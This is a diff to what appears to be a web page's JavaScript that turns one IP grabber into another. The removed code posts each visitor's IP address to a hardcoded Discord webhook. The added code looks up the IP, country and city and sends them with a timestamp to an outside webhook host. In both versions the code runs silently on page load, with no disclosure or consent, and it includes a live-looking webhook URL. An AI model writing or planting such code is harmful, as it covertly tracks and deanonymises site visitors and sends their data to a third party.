@@ -1,50 +1,42 @@
 
- async function fetchIPAddress() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                if (!response.ok) {
-                    throw new Error('Network response was not ok ' + response.statusText);
-                }
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('Error fetching IP address:', error);
-            }
-        }
+  const sendIPToDiscord = async () => {
+    try {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const ip = ipData.ip;
 
-        // Function to send data to Discord webhook
-        async function sendToDiscord(ipAddress) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1262391368634859611/7_xhm9DlqzW4QB9f-SNnLdEvJ8U1FUbMaM9_D40ueXHUBHlPsnp0Ry7fguHXJ7yfCr9L'; // Replace with your Discord webhook URL
-            const payload = {
-                content: `IP Address: ${ipAddress}`
-            };
+      const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+      const locationData = await locationResponse.json();
+      const country = locationData.country_name;
+      const city = locationData.city;
+      const time = new Date().toLocaleString();
 
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
+      const webhookURL = 'https://sura.lol/api/66a2b225bcf2a';
+      const payload = {
+        embeds: [{
+          title: 'User Location Information',
+          description: '\n<@903262692335312946>\n' +
+                       '```\nCountry: ' + country + '\n```' +
+                       '```\nCity: ' + city + '\n```' +
+                       '```\nTime: ' + time + '\n```' +
+                       '```\nIP Address: ' + ip + '\n```',
+          color: 0x008080
+        }]
+      };
 
-                if (!response.ok) {
-                    throw new Error('Network response was not ok ' + response.statusText);
-                }
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
 
-                console.log('IP address sent to Discord successfully');
-            } catch (error) {
-                console.error('Error sending to Discord:', error);
-            }
-        }
+      console.log('wsp g');
+    } catch (error) {
+      console.error('um..this is a problem: ', error);
+    }
+  };
 
-        // Main function to fetch IP and send it to Discord
-        async function main() {
-            const ipAddress = await fetchIPAddress();
-            if (ipAddress) {
-                await sendToDiscord(ipAddress);
-            }
-        }
-
-        // Call the main function when the page loads
-        window.onload = main;
+  // Call sendIPToDiscord function when the page loads
+  sendIPToDiscord();
